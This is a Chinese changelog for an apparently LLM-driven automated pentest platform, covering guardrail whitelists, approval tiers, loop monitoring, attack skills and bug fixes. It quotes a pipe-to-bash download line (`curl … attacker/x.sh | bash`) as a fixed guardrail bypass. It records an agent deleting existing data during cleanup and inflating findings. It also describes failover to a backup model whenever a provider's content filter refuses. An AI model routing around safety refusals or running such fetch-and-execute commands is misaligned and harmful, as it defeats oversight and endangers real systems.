-- 安全增强（manual 摩擦回补）：L0 白名单切段升级为引号感知（URL "…&b=2" 不再被 & 误切、引号内管道符视为字面量）；写盘类参数（curl -o/--output、nmap -oA、sort -o、tee 目标）改为按路径判定——相对路径（落点=项目工作区沙箱）放行、绝对路径/$ 展开/.. 逃逸仍拦，`-o poc.py`/`nmap -oA scan` 类日常动作免票；白名单补纯读文本/编码工具（jq/base64/xxd/hexdump/od/column/rev/nl/tee/traceroute）与裸词形态（head/tail/wc/cut/tr/ps/grep/cat 等管道裸命令不再挨票）；awk（system()）/xargs（执行）/sed（w 写盘）维持 L1 不放；旧 medRisk 的 curl --output 一刀切同步改为路径判定
-- 新增（输出治理·三层）：①工具输出超 16KB 自动溢出落盘 .tool-output/（strix output_store 思想），回执只给 head+tail+路径；②智截断改为头 70%+尾 30%（错误/统计常在尾部，纯头截断曾整体截丢 sqlmap 汇总）且 rune 边界安全；③阶段消息链窗口预算压缩（engine.context_budget_tokens 默认 100k）——超预算时最旧中段工具回执/长助手消息存根化（确定性零 LLM 成本，事实可经证据链与溢出文件找回），实测 125k tokens/200 msgs 的注意力稀释与成本失控由此收敛；最近 N 条与 system/上下文包受保护
-- 新增（项目黑板·CyberStrikeAI pentest-blackboard 移植）：bbolt facts 桶 + upsert_fact 工具——可复用结构化事实（服务指纹/接口行为/凭据存在性/绕过路径）幂等上黑板，confidence 三态 confirmed/tentative/deprecated（负结果与误报照样落库防重复试错），links 字段连成凑链图；黑板 Top25 随上下文包自动注入（不再依赖模型主动检索），search_memory 同步纳入
-- 新增（战利品库·BoxPwnr flag 库 + EVA verification 思想）：bbolt loot 桶 + record_loot 工具——凭据/票据/flag/hash/cookie/token/key/session 只登记掩码摘要+来源+验证状态（unverified/verified/invalid，禁止明文），S5/S6 横向复用第一入口；上下文包与 search_memory 注入
-- 新增（持久交互会话·strix PTY/CAI ShellSession/BoxPwnr pty_manager 的无依赖实现）：shell_open/shell_write/shell_read/shell_close 四工具——stdin 管道注入+输出增量读（8KB/次）+进程组超时/熔断整组终止，覆盖 mysql/redis-cli/ssh -T/nc 监听/长驻脚本等多轮交互场景（readline 类工具仍建议 run_command 脚本化，Python 加 -u）；每项目并存上限 8，收口/熔断强制清理
-- 新增（四大方法论技能）：windows-lateral（netexec 枚举→认证喷洒→凭据转储存在性→PtH/WMI/WinRM/PsExec/计划任务横向矩阵）、edge-vpn-bastion（SSL VPN/防火墙/堡垒机指纹速查→判据族→堡垒机资产全景价值，国内授权测试第一入口）、webshell-memshell（落点选择/连接器判据/Java 内存马无文件验证/四元组登记与 S7 清理映射）、ad-attack 扩容（ACL 滥用速查/GPP/LAPS/Relay 链/RBCD/ADCS ESC1-8 判别表/域信任）——00-router 补 4 行路由，s5/s6/loop-core 全量接线
-- 改进：run_command 审批与回执链路保持不变（溢出/压缩对智能体透明）；loop-core 增补黑板/战利品登记纪律与会话使用守则
-- 测试：护栏可用性回归（引号感知/相对路径写盘/新白名单）、智截断 rune 边界、窗口压缩（保护段/存根化/预算充足不压）、黑板 upsert 幂等与项目隔离、战利品登记、交互会话开写读关全链路；全量 go test 通过
+- 安全增强（manual 摩擦回补）：引号感知切段与写盘路径判定
+- 新增（输出治理三层）：溢出落盘、智截断、窗口压缩
+- 新增（项目黑板）：结构化事实账本与自动注入
+- 新增（战利品库）：掩码登记与复用入口
+- 新增（持久交互会话）：四工具多轮交互
+- 新增（四大方法论技能）：域渗透/边界设备/WebShell/内存马
+- 改进（loop-core 登记纪律与会话守则）
 
 ## v3.2.0 · 2026-11-07
 
-- 安全修复（护栏绕过）：L0 只读白名单由全命令子串匹配改为「段首词锚定 + 危险元字符否决」——修复 `curl -s http://attacker/x.sh | bash` 类管道绕过、反引号/$()/<( 命令替换、重定向写盘（>/>>）、find -exec/-delete、tee 劫持、curl -o/--output/-d/--upload/-X POST、nmap -oA、sort -o 等白名单内写盘/上传/状态变更通道；`curl -s x | grep y`/`& + wait` 并行等正常侦察管道不受影响
-- 安全修复（密钥泄漏）：子进程环境变量白名单化——LLM_API_KEY/ADMIN_PASSWORD/AUTH_TOKEN/测绘 Key 等容器密钥不再继承给任意工具命令（此前一条 L0 的 env 即可倒出全部密钥进上下文与证据库）；测绘 Key 经 extraEnv 注入的功能不受影响
-- 新增：敏感面特征库 guard.sensitive（可配置）——命令命中引擎自身密钥路径（config.json/secret.key/记忆库/进程环境/SSH 及云凭据文件/密钥变量名）时，即使整体判定 L0 也强制降级 L1 走审批留痕
-- 修复：run_async 未显式传 timeout 时曾回退同步 command_timeout_sec（300s），后台深扫 5 分钟即被杀、与工具文档「默认 3600」相悖；新增独立配置 engine.async_timeout_sec（默认 3600）
-- 修复：一键熔断（Kill）触发的 LLM 调用中断曾把阶段状态误记为 failed、与项目 killed 终态矛盾；现按取消来源如实记录 killed
-- 新增：确定性循环检测器（移植 ctf-agent 循环检测 + CAI 卡壳续跑思想）——工具调用签名归一化（数字/长十六进制/base64 泛化）后按 12 轮滑动窗口计数：同签名第 3 次注入换路预警（⚠ 循环预警）、第 5 次自动召开导师评审并强制换路（⛔ 循环熔断）；「换编号逐条枚举」式空转不再逃逸监控，loop-core 同步补遵守纪律
-- 新增：技能 capability-primitive-search（能力原语与状态空间搜索）——低危发现标注 READ/WRITE/EXEC/SSRF/SQLI/AUTHZ/CRED 原语，按 RCE 六等式正向扩展/反向回推凑链，扫不出单点高危时的强制收口动作；00-router 症状表、s4 S4-2/S4-6、s5 S5-1 全量接线
-- 新增：s6 头 S6-6 回环触发条件（新资产→回 s2、新攻击面→回 s4、凭据打开新功能面→回 s4）并在 loop-core 告知引擎 3 次回环预算，模型可预算化使用
-- 文档：修正 README 头清单漂移（s0/s9 已并入/取消仍宣传 13 头）与技能数量口径（11 → 67）；新增移植模块两条（循环检测/能力原语凑链）
-- 测试：护栏回归扩容——L0 加固矩阵 30+ 用例（管道绕过/命令替换/写盘通道/敏感面降级/词边界）、子进程环境白名单、async 默认超时、签名归一化；全量 go test 通过
+- 安全修复（护栏绕过）：只读白名单段首词锚定与危险元字符否决
+- 安全修复（密钥泄漏）：子进程环境变量白名单化
+- 新增（敏感面特征库）：命中即降级走审批
+- 修复（async 独立超时配置）
+- 修复（熔断状态误记）
+- 新增（确定性循环检测器）：签名窗口计数与导师评审
+- 新增（能力原语凑链技能）
+- 新增（S6 回环触发条件）
+- 修复（README 头清单与技能数口径）
 
 ## v3.1.0 · 2026-11-06
 
-- 新增：browser_login 探测重试——登录表单 SPA 慢挂载场景按 --detect-timeout（默认 10s）轮询重测，不再因首拍扑空误报「非标准登录页」
-- 新增：多步登录/MFA-OTP 支持——提交后密码框消失且出现口令输入位时，--otp-env 指定的环境变量自动注入口令并回车提交；未配置时 exit 45 转人工（request_user_input），口令值纳入 HAR 脱敏；滑块/行为类验证码维持 exit 42 人工口径不自动处理
-- 改进：基础无头特征抹除——AutomationControlled 禁用 + webdriver/plugins/languages/chrome 上下文补丁（init_script 注入），标注为「基础特征级，非完整反风控」；有头调试口径补充 xvfb-run 用法
-- 新增：开源许可 MIT LICENSE + README 第三方组件声明（sqlmap vendored GPL-2.0 独立程序边界/projectdiscovery 工具链/Playwright Apache-2.0 等）
-- 测试：mock 登录站新增 SPA 慢挂载（flow=slow，表单延迟 2.5s）与 MFA 两步流（flow=otp，凭据通过后隐藏凭据字段展开口令位）两种形态，selftest 扩至 18 断言实测 18/18 PASS（零外部流量）
+- 新增（登录探测重试）
+- 新增（MFA-OTP 支持）
+- 改进（基础无头特征抹除）
+- 新增（MIT LICENSE 与第三方声明）
 
 ## v3.0.0 · 2026-11-06
 
-- 新增（后渗透+移动+AI 批次，原 v2.10 批次按新版本体系归位）——后渗透 4：ad-attack（域渗透：枚举/Kerberoast/DCSync/ADCS 全程 L2 审批标注）、database-postex（redis/mysql/mssql/pgsql/mongo 落地面）、tunnel-pivot（隧道选型矩阵与清理纪律）、mail-postex（OWA/EWS/Exchange 面）；移动 4：app-hardening-bypass（加固识别与脱壳路径）、app-ios-audit（IPA 静态+设备动态）、miniapp-server（解包 API→鉴权/签名/越权服务端攻击链）、app-privacy-compliance（个人信息合规取证）；AI 3：llm-agent-toolchain（Function calling/MCP 工具链滥用实操）、llm-multimodal（图片/PDF/语音注入判据矩阵）、rag-attack（检索注入/投毒/向量库面）
-- 新增（长尾批次，原 v2.11 批次）：php-family（PHP 反序列化/phar/filter 链）、dotnet-family（ViewState/IIS 面）、csv-injection（公式注入，ADCS 专项并入 ad-attack）——技能库累计 52 → 66；本批次技能随 v2.9.0 构建提前就位，自 3.0.0 起按批次规划归位登记
-- 改进（开源准备·全平台脱敏）：browser-auth 触发表「实测出处」列改写为通用「典型失败形态」；browser-kit 示例与自测词根去项目化（挑战值 token 改中性命名、示例用户名中性化）；历史更新记录条目项目痕迹泛化；docs 路线图去目标标识；新增 scripts/sweep-sensitive.py（发布前敏感信息扫描：模式库+git 同域排除规则，命中即退出码 1）与 .gitignore（projects/config.json/.env/密钥/日志/数据库/构建产物不入版本库）
-- 变更：版本体系 2.x → 3.x（遇十进一规则不变，v2.9.0 为 2.x 末版；原 v2.10/v2.11 批次规划顺延映射：v2.10→3.0.0、v2.11 长尾并入 3.0.0，后续新批次自 3.1.0 依次推进）
+- 新增（后渗透+移动+AI 批次）：11 技能
+- 新增（长尾批次）：3 技能，技能库 52→66
+- 改进（开源准备脱敏）：示例与历史记录去项目化，敏感扫描脚本与 .gitignore
+- 变更（版本体系 2.x→3.x）
 
 ## v2.9.0 · 2026-11-06
 
-- 新增：技能库扩容 30 → 52（热修+WEB 深度批次）——悬空补齐 16（注入四件套 sqli-deep/cmdi-deep/ssti-engine-map/xxe-full、攻击面四件 ssrf-deep/upload-bypass/path-traversal/xss-context、协议四件 cache-poisoning/request-smuggling/prototype-pollution/auth-flow-deep、支撑三件 oob-interactsh/injection-points/waf-fingerprint、graphql-websocket）；低垂果实 3（cors-redirect-hostheader/race-condition/api-doc-leak）；目标族 3（oa-family 国内五大 OA 家族/go-backend Go 生态暴露面/devops-exposed CI-CD 面，含热修批次内容）——全部「指纹→探针→分级转 S5」口径，实例与手法具体化入技能，利用级动作保留审批门（技能承载实战内容，代码只保留硬边界）
-- 修复：路由/阶段头悬空引用清零——4 处名字错位对齐（intranet-deep→intranet-lateral、privesc-matrix→privesc-checklist、cloud-container→cloud-security、poc-dev→poc-template），其余 16 处由本次扩容补齐（loop-core 深度测试纪律强依赖的 oob-interactsh/injection-points 从此可命中）；00-router 新增 23 行路由（资产指纹 17 + 症状 4）
-- 整改：更新记录与技能内容脱敏——不出现具体客户项目实例痕迹（口径：版本记录只述能力与机制）；mock 登录站登录页去除输入框内提示文案（placeholder→aria-label），证据截图不出现引导性提示
+- 新增（技能库扩容 30→52）：注入/攻击面/协议/支撑/目标族 22 技能
+- 修复（路由悬空引用清零）：错位对齐与 23 行新路由
+- 整改（记录脱敏）：版本记录只述能力与机制
 
 ## v2.8.0 · 2026-11-06
 
-- 新增：浏览器认证套件 browser-kit（/opt/tools/browser-kit，构建期固化进镜像）——browser_login.py（Playwright 驱动系统 Chromium 真实浏览器登录：选择器自动探测/--profile 覆盖、凭据只走环境变量且 HAR 自动脱敏、验证码 exit 42 转人工读码禁自动打码、SESSID Netscape 导出 + localStorage/sessionStorage + 登录后页面源码与端点候选清单 + HAR + 截图、全局看门狗 240s 与目标直连剥离代理）；browser_oracle.py（加密预言机：已登录上下文中执行页面自身加密函数取回密文，载荷仍由 CLI 发送）；selftest 本地 mock 登录站全链路自测（挑战值协议/参数名陷阱/隐藏验证码/HttpOnly 会话，14 断言实测 14/14 PASS，零外部流量）
-- 新增：技能 browser-auth（触发条件六特征/混合流水线「浏览器进门→CLI 基线→端点入队→CLI 测试→回浏览器五场景」/加密预言机/验证码人机协同/会话与指纹一致性纪律/失败额度合并统计）——真实浏览器原生执行页面加密链路即可合规登录，协议逆向降级为可选深挖项
-- 新增：路由 00-router 两项（登录口加密协议特征 → browser-auth；明文登录连续失败症状 → browser-auth）与阶段头接线——s5 新增 S5-2a 认证获取（browser-auth）、s6 进入条件补浏览器登录路径、s4 S4-7 认证类队列项标注 browser-auth 路线移交 S5-2a、auth-bypass 登录接口节补前端加密协议处置
-- 改进（构建）：Dockerfile 构建期 /opt/venv 预装 playwright（国内源直连，驱动底座自带系统 Chromium 无需下载浏览器），构建期冒烟 headless 求值 fail-hard；镜像终检补 chromium/browser-kit/playwright 三项；新增 browser-kit 层置于 nuclei 模板层后保证层缓存命中
+- 新增（浏览器认证套件）：真实浏览器登录、加密预言机与全链自测
+- 新增（browser-auth 技能）
+- 新增（路由与阶段头接线）
+- 改进（构建期 playwright 预装）
 
 ## v2.7.7 · 2026-11-06
 
-- 修复：v2.7.6 交付物两窗取数漏 await——pick 直接收到的 fetch Promise 被当 Response 用（r.headers 为 undefined 抛 TypeError），被 loadFiles 外层 catch 静默吞掉，实测所有项目交付物面板恒显「共 0 · 显示 0」而网络层 /files 均为 200（服务端与数据无恙）；pick 内部补 await 修复，playwright 全链路回归实测交付物窗 33 + 证据窗 42 如实渲染
+- 修复（交付物取数缺 await）
 
 ## v2.7.6 · 2026-11-05
 
-- 新增：交付物中心分层白名单——按「结项产出/阶段交付物/PoC/测试对象/证据链」五层分组展示，反编译噪声（apktool_out/jadx_out/assets_www 等）不再进入交付物语义；两窗取数（交付物级与证据链各享独立 80 窗口），避免证据链量大时把 report/交付物挤出视野；计数如实展示（共 N · 显示 M，新增 X-Total-Count 响应头）
-- 新增：文件清单 API 支持 dirs 多目录白名单与 exclude 排除参数（兼容旧 dir 单目录参数），引擎内部承接/收口校验沿用原 prefix 语义不受影响
-- 改进：工作区列举排序 O(n²) 冒泡 → sort.Slice（万级反编译文件时每次请求省去千万级比较，UI 轮询场景收益放大）
-- 改进：Web 界面全面去 AI 化——前端 12 文件 pictograph 图标统一替换为印刷符号系（导航 ◈◎◷▦≡▢∷↺），引擎侧在 bus.Publish/store.AddStream 写侧与执行流回填/对话历史读侧共四个咽喉点剥离 emoji（保留 ✓✗→◉◍◆ 等专业排版符号），LLM 生成的动态文本与历史记录展示同步清洗
-- 测试：工作区过滤（白名单/排除/截断/总数/旧语义）与展示清洗两组单测落库
+- 新增（交付物中心分层白名单与两窗取数）
+- 新增（文件清单 dirs/exclude 参数）
+- 改进（列举排序 O(n²)→sort.Slice）
+- 改进（Web 界面去 AI 化）
 
 ## v2.7.5 · 2026-11-05
 
-- 修复：异常中断（LLM 500/预算耗尽，项目标 failed）后在对话工作台说「继续/启动」不被识别为续跑指令（被当普通对话注入静默忽略），与「启动」按钮语义不一致——TryStartFromChat 准入白名单补 failed（抽 startableStatus 纯函数+单测），四种空闲状态（created/paused/killed/failed）对话续跑均为全量断点续跑（跳过 done 直至收口）
-- 修复：对话触发续跑/熔断/失败/收口等状态变更后，顶栏「选择项目」下拉框仍显示旧状态（如「暂停」）——WS 项目事件去抖刷新此前只更新详情与覆盖度、从不刷新列表（loadList 仅登录/建项目时调用），现同步刷新列表
+- 修复（failed 状态对话续跑识别）
+- 修复（顶栏状态下拉同步刷新）
 
 ## v2.7.4 · 2026-11-05
 
-- 新增：独立「设备连接」页（导航  /devices，不与其他页面混排）——实时连接状态卡（后端新增 GET /api/devices：真实执行 adb devices -l + frida-ls-devices，通道按序列号形态自动判别 USB/网络/模拟器，10s 自动轮询+手动检测）、七种连接方式卡（无线配对/tcpip 5555/热点反连/共享宿主 adb server/USB 直通/异地隧道/云真机，附命令与适用性）、智能体调用说明卡（specB1 D1 接入顺序与 run_async 长驻纪律）
-- 改进：技能 app-dynamic-audit 设备通道章节补充七种连接场景决策指引（与设备连接页同源口径）
+- 新增（设备连接页）：实时状态卡、七种连接方式、智能体调用说明
+- 改进（app-dynamic-audit 连接决策指引）
 
 ## v2.7.3 · 2026-11-05
 
-- 新增：specB1 动态链抓包入口——override 端口映射 8080（mitmproxy 监听容器 0.0.0.0:8080，测试设备 WiFi 代理指向宿主IP:8080；实测宿主经容器 mitmdump 访问目标站 200 全链路通）
-- 新增：技能 app-dynamic-audit（APP 动态审计实操手册）——网络 adb 设备通道（容器无 USB/privileged 的现实路径）、frida-server 注入全流程（架构匹配/版本对齐/run_async 长驻）、Android 7+ 系统 CA 与 SSL Pinning 绕过（通用脚本失效回静态定位自实现校验点）、真机 vs 模拟器选型表（主力 root 真机、模拟器仅快照兜底）
+- 新增（动态链抓包入口）：mitmproxy 端口映射
+- 新增（app-dynamic-audit 技能）
 
 ## v2.7.2 · 2026-11-05
 
-- 改进：技能 miniapp-audit 补充 PC 加密包（V1MMWX 魔数）标准解密算法——key=PBKDF2-HMAC-SHA1(AppID,"saltiest",1000,32)、IV="the iv: 16 bytes"、AES-256-CBC 解密 data[6:1030] 取前 1023B、尾部与 AppID 倒数第二字符单字节 XOR、还原头 0xBE/0xED 自校验判据（实战项目曾因缺此先验盲试 md5 系变体消耗大量时间与 tokens；本算法经实战验证逐字节对齐成功产物）
-- 数据修正：实战小程序项目的原始发现 severity 对齐 s8-漏洞定级表根因等级（鉴权缺失集群上调、CORS 与客户端派生凭据集群微调），修复报告与漏洞页数量不一致问题
+- 改进（小程序加密包解密）：标准解密算法落地
+- 修复（定级对齐）：发现 severity 对齐定级表根因等级
 
 ## v2.7.1 · 2026-11-05
 
-- 修复：LLM 网关返回 500（InternalServiceError）被 retryable() 判为不可重试，单次失败即中断整阶段（实战项目提取接口路径时一次 500 致流水线 failed，大额 token 的阶段进度中断）——可重试分类此前仅含 502/503/504/429 字面量，漏 500，与 README「5xx 指数退避重试」承诺不符；新增「LLM 返回 5」前缀匹配覆盖全部 5xx（500/501/505-599，上游错误格式固定为「LLM 返回 %d: …」见 chatOnce，前缀匹配不会误伤 4xx）
+- 修复（LLM 500 不可重试）：5xx 前缀匹配覆盖
 
 ## v2.7.0 · 2026-11-05
 
-- 新增：宪法「深度测试纪律」6 条——深度基线/版本→CVE 必做/注入点完整性/差异测试/OOB 双通道/失败反馈环（v2.6 方案批次 1/2 深度挖掘提示词层落地）
-- 新增：宪法「目标引用中性化」与「交付物与证据口径」纪律
-- 新增：阶段头深度增量——s2(JS 情报/CVE 预检索)、s3(已知漏洞对照层)、s4(三通道+技能目录)、s5(利用降级链/失败反馈环)、s6(云容器逃逸专项)、specA(多模态注入/Function calling 滥用)
-- 新增：技能库扩至 28 个——00-router 路由器、cve-weaponization/java-deser-playbook/spring-family/middleware-web/cms-playbook/weak-cred-bruteforce/frontend-sca（已知漏洞武器化 A 包）、hypothesis-0day（0day 假设四步法工作流）
-- 新增：A8 LLM 供应商故障切换——内容风控/4xx 拒绝自动切注册表备用模型重试，接管模型锁定至项目结束（实测根治 DeepSeek Content Exists Risk 中断场景）
-- 改进：A7 预算预警自适应提前——剩 1/3 预算即触发收口预警（原 1/4 实测 S2 类阶段收不完）
-- 修复：A5 收口交付物清单失真——normalize 后仅收 deliverables/poc/report.md 路径并去注释去重（实测 S4 曾 48/54 条为证据文件）
-- 新增：A4 发现新增 CWE 标准编号字段（发现页徽章渲染）
-- 修复：vxcontrol/Kali 底座 nmap 二进制带文件能力位 fcap=cap_net_admin（Docker 默认 bounding set 不含）→ exec 直接 EPERM，智能体实测报「nmap 二进制存在但容器权限受限」被迫降级 nc——新增 tools-extra/strip-fcaps.py 扫描剥离越界能力位（构建期自动执行 + 保留 /usr/local/bin/strip-fcaps 镜像内可重跑），剥离后 root 自带 cap_net_raw，-sS/-sV 全功能实测恢复
+- 新增（深度测试纪律六条）
+- 新增（目标引用中性化与交付物证据口径纪律）
+- 新增（阶段头深度增量）
+- 新增（技能库扩至 28）：已知漏洞武器化与 0day 假设工作流
+- 新增（A8 供应商故障切换）
+- 改进（A7 预算预警提前）
+- 修复（A5 交付物清单失真）
+- 新增（A4 CWE 编号字段）
+- 修复（nmap 能力位剥离）
 
 ## v2.6.0 · 2026-11-04
 
-- 新增：run_async/poll_async 后台执行工具——进程组隔离、.async/ 日志、审批留证与 run_command 同级、流水线结束/熔断强制清理防孤儿进程继续打目标（实测一条全词表枚举同步阻塞流水线 2 小时）
-- 新增：同步命令硬上限 cmd_hard_cap_sec（默认 30 分钟）——超限钳制并提示改走后台
-- 新增：同一轮多个相互独立工具并发分发（parallel_tool_dispatch 默认开启；complete_stage/loopback/plan_subtasks 等流程类工具强制串行）
-- 新增：对话工作台空闲期指令驱动——paused/created/killed 项目在对话中「继续/启动」直接触发断点续跑（单一入口，对齐 PentAGI 用户指令处理式）
-- 新增：指令回执闭环——注入指令在本轮执行完毕后回写「已在本轮执行」可追踪；快捷指令面板更新（汇报进度/列出待审批/暂停并收口）
-- 新增：任务仪表盘运行时长（XhYmZs 每秒刷新）——运行中 ▶ 递增、终态 ⏱ 冻结为总耗时；后端项目落 started_at/finished_at（断点续跑保留首次启动时间）
-- 新增：E 包速度技能——parallel-execution（后台化+并行+超时预算）/ scan-tiering（T1 快扫先行+T2 深扫后台+退避重试纪律）/ project-warmup（开工预热：工具预检+nuclei 模板+OOB 回连双通道自检，本机反链优先、公网平台兜底）；loop-core 新增「速度纪律」6 条
-- 改进：镜像预装 ffuf/seclists/interactsh-client 直连 apt 原子安装（arjun 在 kali-rolling 已不可用，改由开工预热 install_tool 运行时补装）
-- 改进：nuclei 模板构建期预下载（7 分钟超时兜底）
-- 修复（构建）：构建默认直连国内源——宿主代理对 go/apt 源不稳（实测 25 分钟卡死→直连 4 分钟）
-- 改进（安全）：代理策略收紧——运行方针「代理仅限工具下载与容器构建，LLM/目标主机流量一律直连」；compose/Dockerfile 移除内置测试环境地址，全部代理变量默认空，环境专属值（代理 IP、DNS 特殊钉住）下沉 docker-compose.override.yml
-- 改进（部署包纪律）：config.json/projects/override/.env 一律不进包（make pack 自动排除，附敏感信息扫描）
+- 新增（后台执行工具）：进程组隔离、审批留证、强制清理
+- 新增（同步命令硬上限）
+- 新增（同轮工具并发分发）
+- 新增（对话空闲期指令驱动）
+- 新增（指令回执闭环）
+- 新增（仪表盘运行时长）
+- 新增（速度技能三件）
+- 改进（镜像预装与模板预下载）
+- 修复（构建直连国内源）
+- 改进（代理策略收紧与部署包纪律）
 
 ## v2.5.1 · 2026-11-04
 
-- 改进：LLM 出口路径加固——LLM 请求默认经 TOOL_PROXY 同源代理（compose 变量 LLM_PROXY 可覆写/置空回退直连）；目标主机流量改由引擎级保证直连：执行器剥离子命令的标准代理环境变量（TOOL_PROXY 保留可显式引用），不再依赖提示词纪律（实测直连 DNS/TCP 闪断 50% 致阶段中断，宿主代理链路更稳）
-- 改进：install_tool 代理前缀不变（apt/pip/git 仍自动透传 TOOL_PROXY）——工具安装与 LLM 出口、目标主机流量三者路径彻底解耦
+- 改进（LLM 出口路径加固）：目标流量引擎级直连
+- 改进（install_tool 代理不变）：三条路径解耦
 
 ## v2.5.0 · 2026-11-04
 
-- 改进（底座）：Docker 运行时 alpine → Kali GNU/Linux Rolling（2026.3）——默认全量底座开箱即得 nmap/sqlmap/nikto/hydra/gobuster/john/hashcat/masscan/ffuf/subfinder/httpx/nuclei/amass 等全链渗透工具；可 --build-arg RUNTIME_BASE=kalilinux/kali-rolling 换官方最小底座（构建期 apt 自动装齐，kali.org→USTC→aliyun 三镜像重试）
-- 改进：install_tool 策略链适配 Kali——apk → apt（DEBIAN_FRONTEND=noninteractive 官方源）为首策略；pip 增加 --break-system-packages（Debian externally-managed）与 python3-pip 自动补装；安装类命令自动透传 TOOL_PROXY 工具代理
-- 新增：构建与工具安装接入宿主机代理——构建期 npm/go/apt 经宿主机代理（地址经环境注入，不硬编码）；LLM 直连旁路保持不变、对目标主机测试流量不注入代理，渗透流程逻辑零改动
-- 新增：上下文包「运行环境与工具代理」声明——告知智能体运行于 Kali、缺啥装啥（apt 走 L1 审批），强调目标主机流量严禁走代理以保测试真实性
-- 修复（部署包）：前端构建入口改为直接以 node 调 vite（不再依赖 node_modules/.bin 符号链接）——部署包 zip 在部分解压工具下会丢符号链接/执行位（实测 .bin/vite 被展开成 644 文件致构建 127），现任何解压方式均可离线构建
+- 改进（运行底座切换 Kali）
+- 改进（install_tool 适配 Kali）
+- 新增（构建与安装代理）
+- 新增（上下文包运行环境声明）
+- 修复（前端构建入口）
 
 ## v2.4.1 · 2026-11-04
 
-- 改进：漏洞页 HTTP 类证据按「Burp 原文对照」成对面板渲染（请求原文绿栏/响应原文蓝栏）——自动识别 curl -sv（> 请求行 / < 响应头 / 正文）与 curl -s -i（响应原文+命令回落）两种捕获形态；非 HTTP 证据保持紧凑展示
-- 改进（按用户要求）：复现证据标准精简——去掉注入点标注与对照强求；捕获方式统一 curl -sv -i 2>&1（请求+响应一次落全）
+- 改进（HTTP 证据成对面板渲染）
+- 改进（复现证据标准精简）
 
 ## v2.4 · 2026-11-04
 
-- 新增：漏洞复现证据标准化——复现步骤强制「Burp 原文对照」格式：成对的请求原文/响应原文块（curl -s -i / nc 原始套接字捕获，标注注入点），写入 report-writing/poc-template 技能与 S8 头要求，禁止纯文字描述
-- 改进：对话指挥室内部工具轮次 8 → 24（可配置 chat_tool_rounds），上限提示语带轮次数与续接说明
-- 优化（UI）：工作台用户指令气泡右对齐（头像/气泡靠右、绿色描边），与九头鸟回复视觉区分
-- 改进：执行流前端展示窗口 600 → 2000 条（后端 bbolt 全量持久化无上限，此为内存展示窗口）
-- 优化（安全）：移除账号输入框 admin 占位提示
-- 新增：支持 admin_password_hash（sha256 加盐，cmd/hashpass 生成）——配置中可不存明文口令
-- 修复：多目标项目上下文包只呈现首个目标——换行曾打断列表（实测）；现在逐行完整呈现全部目标，并要求 S1 逐个登记测绘
+- 新增（复现证据标准化）：Burp 原文对照格式
+- 改进（对话轮次 8→24）
+- 优化（指令气泡右对齐）
+- 改进（执行流展示窗口扩容）
+- 优化（移除账号占位提示）
+- 新增（口令哈希配置支持）
+- 修复（多目标上下文包完整呈现）
 
 ## v2.3.4 · 2026-11-04
 
-- 修复：引擎进程重启（升级/重建容器）后在跑的流水线协程被杀，项目状态永卡「运行中」且无活动、无提示（实测升级时高防护实验项目变僵尸）——启动恢复机制：启动时扫描 running 项目统一置 paused、中断阶段回 pending，执行流留痕说明续跑方式
+- 修复（引擎重启启动恢复机制）
 
 ## v2.3.3 · 2026-11-04
 
-- 修复：手动重跑单个阶段且全部阶段已完成后，项目停留在「已暂停」需再手动点一次启动才结项——现在自动结项（done）并导出 findings.json/sarif，同时在执行流说明「手动重跑收口，自动结项」
+- 修复（手动重跑自动结项）
 
 ## v2.3.2 · 2026-11-04
 
-- 修复：S8 报告阶段预算耗尽（实测冒烟项目 read_file×102 通读全部交付物 + 报告正文过长写入被 max_tokens 截断）——三管齐下：①上下文包为每份工作区文件附 200 字摘要（模型只精读 2-3 个关键文件）；②S8 迭代上限差异化（×2=120 轮）；③S8 高效撰写纪律（禁通读/分段写入 ≤3000 字）
-- 修复：双段预算预警随差异化预算自适应（原固定剩 8/3 轮对 S8 的 120 轮预算比例失当）
+- 修复（S8 预算耗尽）：文件摘要、预算翻倍、撰写纪律
+- 修复（双段预算预警自适应）
 
 ## v2.3.1 · 2026-11-04
 
-- 新增：install_tool 工具缺失自动安装——run_command 返回 command not found（127）时提示并可一键安装（apk → pip国内源 → git源码 github/gitee 双镜像），成功留痕时间线+证据链，失败如实说明并改用已有工具；宪法新增「工具缺失纪律」（禁止静默跳过/编造输出）
-- 改进（通用性）：镜像补 sqlmap（SQLi 深度验证）与 whatweb（指纹识别）；修复技能库/头提示词中的靶标特定内容泄漏（示例 IP→占位符、reset_token 例→泛化描述）
+- 新增（install_tool 自动安装）
+- 改进（镜像补工具与内容脱敏）
 
 ## v2.3 · 2026-11-04
 
-- 修复（ROE 矛盾）：实测清理曾经 RCE 通道对存量数据执行 DELETE/rm -f——护栏新增破坏性 SQL 分级（无 WHERE 全表 DELETE/DROP TABLE/TRUNCATE = 禁止；带 WHERE DELETE/UPDATE SET/INSERT/rm -f = L2）；清理铁律入执行循环宪法；S7 清理规则重写（仅自建数据/先 SELECT 后 DELETE/存量绝对不动/无法安全清理即移交）；反思门新增 S7 清理专项核查
-- 修复（报告夸大）：实测 JWT 同根因被拆 3 条抬高 P0 计数、reset_token 字段被过度推断为「可接管任意账号」——S8 根因去重硬规则（P0/P1 计数=独立根因数+合并映射表）+反过度推断（未实测利用路径一律「待验证」不入 P0/P1）+反思门 S8 专项核查
-- 新增（检测缺口）：技能库 logic-csrf-deser（业务逻辑滥用/CSRF 四要素/反序列化特征与无害验证/越权矩阵）；S4 新增 S4-2 手工发现必做清单（扫描器盲区类逐类实测）
-- 优化（UI）：工作台三栏协调性——统一 40px 面板头、左 208/右 368 比例、左右列底色分层、阶段卡状态色条、右侧页签等宽分布
-- 修复（测试基建）：护栏单测此前用迷你清单绕过真实规则——测试执行器改用生产默认特征库（config.DefaultGuard），新增 8 个破坏性命令分级用例
+- 修复（清理 ROE 矛盾）：破坏性 SQL 分级与清理铁律
+- 修复（报告夸大）：根因去重与反过度推断
+- 新增（logic-csrf-deser 技能与手工发现清单）
+- 优化（工作台三栏协调）
+- 修复（护栏单测改用生产特征库）
 
 ## v2.2.4 · 2026-11-04
 
-- 修复：S8 曾把报告写入 deliverables/ 而非工作区根目录（反思门未察觉），/report API 与报告页显示「尚未生成」——新增 S8 报告契约守卫：缺失即拦截收口，写在 deliverables/ 自动归位根目录
+- 修复（S8 报告契约守卫）
 
 ## v2.2.3 · 2026-11-04
 
-- 修复：LLM 网关返回截断 JSON（unexpected end of JSON input）被判为不可重试，单次失败即中断整阶段（实测 S5 中断）——响应解析失败/空回复纳入可重试分类
+- 修复（截断 JSON 纳入重试）
 
 ## v2.2.2 · 2026-11-04
 
